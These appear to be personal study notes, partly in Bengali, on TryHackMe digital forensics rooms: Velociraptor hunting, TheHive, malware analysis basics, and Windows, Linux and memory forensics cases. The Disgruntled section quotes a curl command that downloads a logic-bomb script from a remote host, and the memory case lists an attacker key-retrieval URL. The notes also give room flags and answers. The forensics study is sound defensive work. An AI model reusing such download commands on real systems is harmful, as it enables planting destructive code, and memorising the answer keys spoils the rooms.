Exclude directories	IsDir
🚨 Threat Hunting – PrintNightmare
Artifact Exchange Name
Windows.Detection.PrintNightmare

Custom VQL Query (Final)
SELECT "C:/" + FullPath AS Full_Path,FileName AS File_Name,parse_pe(file="C:/" + FullPath) AS PE
FROM parse_mft(filename="C:/$MFT", accessor="ntfs")
WHERE NOT IsDir
AND FullPath =~ "Windows/System32/spool/drivers"
AND PE

Findings

Malicious DLL: nightmare.dll

PDB Path:

C:\Users\caleb\source\repos\nightmare\x64\Release\nightmare.pdb

❓ Questions & Answers (TryHackMe)
Question	Answer
Instant Velociraptor command	velociraptor.exe gui
Client hostname	THM-VELOCIRAPTOR.eu-west-1.compute.internal
Agent version	2021-04-11T22:11:10Z
NTFS hidden files accessor	ntfs accessor
Registry accessor	registry accessor
Hidden flag	THM{VkVMT0NJUkFQVE9S}
PrintNightmare DLL	nightmare.dll
🧠 Key Takeaways (Exam + Real-World)

Velociraptor = Live DFIR at scale

VQL gives SOC analysts SQL-like forensic power

VFS enables remote file & registry access

Artifacts simplify complex hunts

Ideal tool for SOC, IR, Threat Hunting

📁 Recommended GitHub Structure
forensics/
└── velociraptor/
    └── day-09-velociraptor.md
 
 day 10
 
TheHive Project – Day 1
Incident Response Case Management Fundamentals
📘 Summary

TheHive Project হলো একটি open-source Security Incident Response Platform (SIRP), যা SOC, CSIRT এবং DFIR টিমকে security incidents track, investigate এবং collaboratively manage করতে সাহায্য করে।

এই দিনে আমরা শিখেছি:

TheHive কী এবং SOC-এ এর ভূমিকা

Core concepts: Case, Task, Observable, IOC

User roles & permissions

Analyst interface navigation

Network traffic (PCAP) থেকে case তৈরি করা

🎯 Learning Objectives

Understand TheHive platform and workflow

Learn collaborative incident response concepts

Identify user roles and permissions

Create an investigation case with:

Severity, TLP, PAP

Tasks

MITRE ATT&CK TTPs

Observables (IP, PCAP file)

🧠 What is TheHive?

TheHive একটি case-centric incident response platform।

মূল ধারণা:

প্রতিটি incident = Case

Case → Tasks → Observables → IOCs

Multiple analysts একই case-এ একসাথে কাজ করতে পারে

Evidence, notes, tags, timeline সব এক জায়গায় থাকে

👉 Velociraptor / KAPE / Volatility evidence সংগ্রহ করে
👉 TheHive সেই evidence-কে investigation case হিসেবে manage করে

🔑 Core Functions of TheHive
🤝 Collaborate

Multiple analysts একই case-এ কাজ করতে পারে

Real-time updates (live activity stream)

🧩 Elaborate

Case ভেঙে Tasks তৈরি করা

Evidence attach, notes যোগ করা

MITRE ATT&CK mapping

⚡ Act

Observables যোগ করা

IOC flag করা

Cortex analyzers ও responders ব্যবহার (future stages)

🧰 Features & Integrations
Feature	Description
Case & Task Management	Structured IR workflow
Alert Triage	SIEM / Email / Feeds থেকে alert
Observable Enrichment	Cortex integration
Active Response	Responders
Dashboards	Metrics & KPIs
Threat Intelligence	MISP integration

🔍 Observable analysis platform: Cortex

👥 User Roles & Permissions
Pre-Configured Roles
Role	Capabilities
admin	Platform admin, ❌ cannot manage cases
org-admin	Full org & case control
analyst	Create/edit cases, tasks, observables
read-only	View only
Important Permissions
Permission	Function
manageCase	Manage cases
manageObservable	Create/update/delete observables
manageTask	Manage tasks
manageAnalyse	Run analyzers
manageAction	Execute responders
🧭 Analyst Interface Overview

Dashboard: Active cases

New Case creation

Tasks & alerts overview

Observables & evidence tracking

🧪 Practical Investigation Scenario
Scenario

Suspicious FTP network traffic detected → possible data exfiltration

Evidence:

PCAP file (network capture)

FTP connections from suspicious IP

🗂️ Case Creation Workflow
1️⃣ Create New Case

Severity: Medium / High

TLP: Amber

PAP: Amber

2️⃣ Add Tasks

Analyze PCAP

Identify source IP

Check for data exfiltration

Document findings

3️⃣ MITRE ATT&CK Mapping

Tactic: Exfiltration

Technique: T1048.003
(Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol)

4️⃣ Add Observables

IP Address (FTP source)

PCAP file upload

Mark IOC if malicious

📌 Files (PCAP, logs, dumps) are also observables in TheHive

🏁 Result

Uploaded PCAP observable revealed the flag:

THM{FILES_ARE_OBSERVABLES}

❓ Question & Answer
Question	Answer
Observable analysis platform in TheHive?	Cortex
Account that cannot manage cases?	admin
Permission to manage observables?	manageObservable
Permission to execute actions?	manageAction
TTPs imported from?	MITRE ATT&CK
Detection data source type?	Network Traffic
Flag from PCAP observable?	THM{FILES_ARE_OBSERVABLES}
🧠 Key Notes & Takeaways

TheHive = Incident Response Brain

Everything revolves around Cases

Observables connect evidence → intelligence

Files are first-class observables

MITRE ATT&CK mapping adds threat context

Ideal for SOC & DFIR collaboration

📁 Recommended GitHub Structure
forensics/
└── thehive/
    └── day-01-thehive-foundations.md

day 11
 Intro to Malware Analysis

(TryHackMe – Fundamentals)

📌 Summary

এই রুমে malware analysis-এর foundation শেখানো হয়েছে। একজন SOC / DFIR analyst কীভাবে একটি suspicious file দেখে সিদ্ধান্ত নেবে সেটাই মূল লক্ষ্য।

এখানে আমরা শিখেছি:

Malware কী এবং কেন analysis দরকার

Static vs Dynamic analysis

PE file basics

Hashing, strings, VirusTotal

Sandbox behavior

Anti-analysis techniques (packing, sandbox evasion)

🎯 Learning Objectives

Malware identify করা

Initial verdict (malicious / benign) নেওয়া

Safe analysis environment তৈরি

Malware behavior বোঝা

IOC extraction concept বোঝা

🧠 What is Malware?

Malware = Malicious Software

যে software:

Unauthorized কাজ করে

Data চুরি / encrypt করে

System control নেয়

Persistence রাখে

Detection evade করে

সব malware একরকম না — behavior অনুযায়ী আলাদা category থাকে (ransomware, trojan, stealer ইত্যাদি)।

👥 Who Performs Malware Analysis?
Team	Purpose
SOC	Detection rules লেখা
Incident Response	Damage assess & clean-up
Threat Hunting	IOC hunt
Malware Researchers	AV / EDR signatures
OS Vendors	Vulnerability analysis

Correct Answer (THM):
➡️ Threat Hunt Team

⚠️ Malware Analysis Safety Rules

Malware = Digital Weapon

✔️ Dedicated isolated VM
✔️ Snapshot before analysis
✔️ Password-protected malware archive
✔️ No shared folders
✔️ No uncontrolled internet
✔️ Revert VM after analysis

❌ Never analyse malware on personal machine

🔬 Malware Analysis Techniques
1️⃣ Static Analysis

(Without Executing Malware)

File type

Strings

Hashes

PE Header

Imports / Sections

✔️ Safe
❌ Limited behavior visibility

Correct Answer:
➡️ Static Analysis

2️⃣ Dynamic Analysis

(Execute & Observe Behavior)

Processes

Registry changes

Network traffic

File system activity

✔️ Real behavior
❌ Risky if unsafe VM

Correct Answer:
➡️ Dynamic Analysis

3️⃣ Advanced Analysis (Intro only)

Disassembly

Debugging

Unpacking

Memory forensics

🧰 Tools Used
Tool	Purpose
file	Detect real file type
strings	Extract readable strings
md5sum / sha256sum	File identification
pecheck	PE header & entropy
pe-tree	GUI PE analysis
VirusTotal	Reputation & AV verdict
Hybrid Analysis	Sandbox behavior
REMnux	Malware analysis OS
📂 Static Analysis – Practical Findings
🔹 File Type
file wannacry


➡️ PE32 Windows Executable (x86)

🔹 Strings Analysis
strings wannacry


Found:

Windows API calls

Compression libraries

Process & registry functions

🔹 Hashing
md5sum wannacry


Purpose:

Malware fingerprint

Threat intel sharing

VirusTotal lookup

🔹 VirusTotal Result

60+ AV detections

Classified as WannaCry ransomware

Behavior & relations available

🧱 PE File Header Analysis
Common Sections
Section	Description
.text	Executable code
.data	Global variables
.rdata	Read-only data
.rsrc	Resources
Imports Insight

Example findings:

RegOpenKeyExW → Registry access

CreateServiceA → Persistence

InternetOpen → Network communication

🔄 Dynamic Analysis (Sandbox)

Using Hybrid Analysis:

Observed Behavior

First process: setup_installer.exe

Utilities used:

cmd.exe

powershell.exe

Deletes backups & shadow copies

Ransomware-like activity

🛡️ Anti-Analysis Techniques
🔹 Packing & Obfuscation

High entropy sections

Garbage strings

No clear imports

Correct Answer:
➡️ Packing

🔹 Sandbox Evasion

Long sleep calls

VM detection

User activity checks

Correct Answer:
➡️ Long sleep calls

❓ Question & Answers (Complete)
Question	Answer
IOC hunting team	Threat Hunt Team
Analysis without execution	Static analysis
Analysis with execution	Dynamic analysis
MD5 of redline	ca2dc5a3f94c4f19334cc8b68f256259
Creation time	2020-08-01 02:44:18 UTC
.text entropy	6.453919
Fifth section name	.ndata
RegOpenKeyExW DLL	ADVAPI32.dll
First process launched	setup_installer.exe
Windows utilities used	cmd.exe, powershell.exe
Static evasion technique	Packing
Sandbox timeout technique	Long sleep calls
🧠 Key Takeaways

Always start with static analysis

Hash = malware fingerprint

PE imports tell behavior story

Sandbox reveals true intent

Malware actively avoids analysis

Analyst thinking > tools

📁 Suggested GitHub Structure
forensics/
└── malware-analysis/
    └── intro-malware-analysis.md
 day 12
 Unattended

Windows Forensic Investigation Case Study (TryHackMe)

📌 Topic

Unattended System Access & Data Exfiltration Investigation

This case focuses on identifying unauthorized user activity on a Windows system during a specific unattended time window and determining whether sensitive data was accessed and exfiltrated.

🧾 Summary Notes

Unauthorized access occurred while the legitimate user was away

Attacker used Windows Search artifacts to locate sensitive files

Archive utility (7-Zip) was downloaded to bypass access limitations

Sensitive content was staged locally

Data was exfiltrated using Pastebin (cloud-based exfiltration)

No USB devices were used (alternate exfiltration method)

🎯 Case Scope
Item	Details
Date	19 November 2022
Time Window	12:05 PM – 12:45 PM
System Type	Windows
Evidence Source	KAPE-collected disk artifacts
Investigation Type	Post-Incident Forensics
🧰 Tools Used

Autopsy – Timeline & file activity analysis

Registry Explorer – Search history & user actions

KAPE Output – Pre-collected forensic artifacts

Windows Explorer Artifacts – Search & file access evidence

🔍 Detailed Explanation (Step-by-Step)
1️⃣ Initial Access Confirmation

Analysis of timeline artifacts confirmed user activity during the absence window, proving unauthorized access.

2️⃣ Search Activity Analysis

Windows Explorer search history showed intentional and targeted searching, not random browsing.

File type searched: PDF

Keyword searched: continental

📌 This indicates prior knowledge of the file’s content.

3️⃣ Tool Acquisition

The attacker downloaded 7-Zip, a common archive utility, suggesting:

The target file was compressed or protected

The attacker needed extraction capability

4️⃣ File Access

After extraction, a PNG file containing sensitive data was accessed.

This confirms:

Archive was successfully opened

Sensitive content was viewed

5️⃣ Data Staging

A text file was created and opened multiple times on the Desktop, indicating manual data preparation.

6️⃣ Data Exfiltration

Since USB devices were unavailable, the attacker used Pastebin, a public cloud service, to exfiltrate data.

This is a common technique due to:

Ease of access

Low detection threshold

No authentication requirement

❓ Question & Answer (Evidence-Based)
🔎 Task 3 – Snooping Around
Question	Answer
File type searched	.pdf
Top-secret keyword searched	continental
🔐 Task 4 – Can’t Simply Open It
Question	Answer
Downloaded file	7z2201-x64.exe
Download time (UTC)	2022-11-19 12:09:19 UTC
PNG file opened at	2022-11-19 12:10:21
🌐 Task 5 – Sending It Outside
Question	Answer
Times text file opened	2
Last modified time	11/19/2022 12:12
Exfiltration URL	https://pastebin.com/1FQASAav
Exfiltrated string	ne7AIRhi3PdESy9RnOrN
🧠 Timeline Summary
12:05  Legitimate user leaves
12:09  7-Zip downloaded
12:10  PNG file opened
12:12  Text file modified
12:xx  Data exfiltrated to Pastebin
12:45  User returns

🚩 Indicators of Compromise (IOCs)

Search Keyword: continental

File Type Targeted: PDF

Tool Downloaded: 7z2201-x64.exe

Exfiltration Platform: Pastebin

Exfiltration URL: https://pastebin.com/1FQASAav

⚖️ Final Conclusion

✔️ Unauthorized access confirmed
✔️ Sensitive data accessed
✔️ Data exfiltrated externally
✔️ Method used: Cloud-based exfiltration (Pastebin)

🔴 This incident qualifies as a confirmed insider/physical access breach.

📂 Suggested GitHub Structure
forensics/
├── notes/
├── tools/
├── cases/
│   └── unattended.md

day 13
Disgruntled

Linux Forensic Investigation – Logic Bomb Case

📌 Topic

Disgruntled Insider Investigation & Logic Bomb Detection

This investigation focuses on identifying malicious insider activity performed by a disgruntled IT employee, including privilege abuse, unauthorized user creation, and deployment of a logic bomb on a Linux system.

🧾 Case Summary

An IT employee arrested for running a phishing operation was suspected of planting malicious persistence mechanisms on company assets. A forensic investigation was conducted to determine whether unauthorized actions were performed beyond the approved installation of a service.

The investigation confirmed the presence of a logic bomb designed to trigger destructive behavior after a period of user inactivity.

🎯 Case Scope
Item	Details
Platform	Linux
Threat Type	Insider Threat
Attack Type	Logic Bomb
Investigation Focus	Privileged Commands & Audit Logs
Evidence Source	System logs & shell history
🧰 Tools & Artifacts Used

Linux auth.log / sudo logs

Command history

Package manager logs (APT)

File system metadata

Script execution tracing

🔍 Investigation Breakdown
1️⃣ Initial Activity Review – Privileged Command Usage

The suspect used elevated privileges to install a legitimate service, which initially appeared benign.

Command Identified

/usr/bin/apt install dokuwiki


Working Directory

/home/cybert


📌 This aligns with the employee’s stated responsibility, but further actions raised concerns.

2️⃣ Unauthorized User Creation

After installing the package, a new user account was created without authorization.

User Created

it-admin


This indicates persistence preparation or access delegation.

3️⃣ Privilege Escalation

The newly created user was granted sudo privileges, escalating the risk significantly.

Sudoers File Modified

Dec 28 06:27:34


📌 Granting sudo access was not part of the approved task.

4️⃣ Suspicious Script Editing

A shell script was opened using vi, indicating manual modification.

File Edited

bomb.sh


This was the first clear indicator of malicious intent.

5️⃣ Script Origin & Obfuscation

The original script was downloaded from a remote host, then renamed and relocated to disguise its purpose.

Download Command

curl 10.10.158.38:8080/bomb.sh --output bomb.sh


New File Path

/bin/os-update.sh


Last Modified

Dec 28 06:29


📌 Renaming the file to resemble a system update script is a classic evasion technique.

6️⃣ Payload & Impact

The script was designed to execute a destructive payload.

File Created Upon Execution

goodbye.txt


Further analysis revealed the script would:

Check last user login time

Trigger destructive actions if no login occurred in 30 days

Delete service-related files

This behavior confirms a logic bomb.

❓ Question & Answer (Evidence-Based)
🔎 Task 3 – Privileged Activity
Question	Answer
Installed package command	/usr/bin/apt install dokuwiki
PWD during execution	/home/cybert
🔐 Task 4 – Suspicious Actions
Question	Answer
User created	it-admin
Sudoers updated	Dec 28 06:27:34
File edited with vi	bomb.sh
🧨 Task 5 – Logic Bomb Details
Question	Answer
Script creation command	curl 10.10.158.38:8080/bomb.sh --output bomb.sh
Final file path	/bin/os-update.sh
Last modified	Dec 28 06:29
File created on execution	goodbye.txt
🧠 Timeline Overview
Dokuwiki installed (legitimate)
↓
Unauthorized user created
↓
Sudo privileges granted
↓
Malicious script downloaded
↓
Script renamed & hidden
↓
Logic bomb prepared

🚩 Indicators of Compromise (IOCs)

Malicious Script: /bin/os-update.sh

Original Script Name: bomb.sh

Remote Host: 10.10.158.38

Unauthorized User: it-admin

Attack Type: Logic Bomb

⚖️ Final Conclusion

✔️ Insider threat confirmed
✔️ Unauthorized privilege escalation
✔️ Malicious script planted
✔️ Logic bomb intended for delayed destruction

🔴 This incident represents a high-risk insider sabotage attempt.

📂 Suggested GitHub Structure
forensics/
├── linux/
│   └── disgruntled.md
├── windows/
├── memory/
├── malware/

day 14
Memory Forensics Case – CRITICAL
(Windows Memory Analysis with Volatility)
📌 Case Overview (Scenario)

User “Hattori” reported suspicious behavior on his Windows machine.
Several PDF files were encrypted, including a critical company file:

important_document.pdf

Due to suspected credential theft and ransomware-like activity, the DFIR team captured a memory dump for investigation.

🎯 Objective:
Investigate the memory dump to identify:

Suspicious processes

Network activity

Malicious binaries

Evidence of encryption & key retrieval

🎯 Learning Objectives

Understand memory forensics fundamentals

Analyze Windows RAM using Volatility 3

Identify suspicious processes & network connections

Extract forensic artifacts from memory

Recover attacker infrastructure & encryption key evidence

🧠 Memory Forensics – Key Concepts
What is Memory Forensics?

Memory forensics is the analysis of volatile memory (RAM) to identify:

Running processes

Network connections

Decrypted malware payloads

Execution artifacts not present on disk

🧨 RAM is volatile → lost on shutdown/reboot, making it a priority evidence source.

🧰 Tools & Environment
Memory Acquisition Tools
OS	Tool
Windows	FTK Imager, WinPmem
Linux	LIME
macOS	osxpmem

📌 In this case:

Memory dump was acquired using FTK Imager

File analyzed: memdump.mem

Analysis Tool

Volatility 3 (aliased as vol)

🖥️ Environment Setup

OS: Linux Analysis VM

Memory dump location:

/home/analyst/memdump.mem


Volatility help:

vol -h

🔍 Phase 1: Target System Identification
Plugin Used
vol -f memdump.mem windows.info

Findings
Artifact	Value
Architecture	x64
Windows Version	Windows 10
Kernel Base	0xf8066161b000
Processors	2
System Time	2024-02-24 22:52:52

✔ Confirms correct target & context for analysis.

🌐 Phase 2: Network Activity Analysis
Plugin Used
vol -f memdump.mem windows.netscan

Suspicious Findings

Port 3389 (RDP) activity

Port 80 outbound connection

Attribute	Value
Destination IP	192.168.182.128
Process	msedge.exe
Timestamp	2024-02-24 22:47:52

⚠️ Indicates possible attacker interaction or data exfiltration.

🧬 Phase 3: Process Investigation
Plugin Used
vol -f memdump.mem windows.pstree

Suspicious Processes Identified
Process	PID	PPID
critical_updat	❗	❗
updater.exe	1612	critical_updat

🚩 These processes are not legitimate Windows binaries
🚩 Mimic legitimate naming → common attacker tactic

Timestamp

critical_updat started at:
2024-02-24 22:51:50

📂 Phase 4: File System Artifacts (From Memory)
File Scan
vol -f memdump.mem windows.filescan > filescan_out
grep updater filescan_out


📍 Malicious Binary Location

C:\Users\user01\Documents\updater.exe
C:\Users\user01\Documents\critical_update.exe

MFT Analysis
vol -f memdump.mem windows.mftscan.MFTScan > mftscan_out
grep important_document.pdf mftscan_out


📄 important_document.pdf

Created: 2024-02-24 20:39:42

🧠 Phase 5: Memory Dump of Malicious Process
Dump Memory of updater.exe
vol -f memdump.mem -o . windows.memmap --dump --pid 1612


Generated file:

pid.1612.dmp

🔑 Phase 6: Extracting Encryption Evidence
Strings Analysis
strings pid.1612.dmp | less

Critical Findings

🔗 Key Retrieval URL

http://key.critical-update.com/encKEY.txt


📄 Targeted File

important_document.pdf

HTTP Request Analysis
strings pid.1612.dmp | grep -B 10 -A 10 "http://key.critical-update.com/encKEY.txt"

Attacker Infrastructure
Artifact	Value
Web Server	SimpleHTTP/0.6 Python/3.10.4
Encryption Key	cafebabe

🧨 Key was retrieved in-memory (never written to disk)

❓ Question & Answer Summary
Task-wise Answers
Question	Answer
Memory analyzed	RAM
Dump phase	Memory Acquisition
OS info plugin	windows.info
Linux dump tool	LIME
Volatility help	vol -h
Architecture x64?	Y
Windows version	10
Kernel base	0xf8066161b000
Port 80 destination IP	192.168.182.128
Port 80 owner	msedge.exe
Child PID of critical_updat	1612
critical_updat timestamp	2024-02-24 22:51:50
critical_updat path	C:\Users\user01\Documents\critical_update.exe
important_document.pdf created	2024-02-24 20:39:42
Attacker server	SimpleHTTP/0.6 Python/3.10.4
🧾 Final Conclusion

This investigation demonstrated how memory forensics alone can reveal:

Active ransomware-like behavior

Malicious processes disguised as system updates

Network communication with attacker infrastructure

Encryption keys retrieved directly from RAM

Evidence unavailable through disk forensics

🧠 Key takeaway:

Memory forensics is critical for detecting fileless malware, in-memory keys, and live attacker activity.

📚 Further Learning

Windows Forensics 2

Linux Forensics

iOS Forensics

Windows Applications Forensics

Advanced Malware Analysis

📂 Suggested GitHub Structure
forensics/
├── memory-forensics/
│   ├── critical-case.md
│   └── volatility-notes.md
├── windows-forensics/
├── malware-analysis/

COMPLITE Digital Forensics and Incident Response(DFIR)
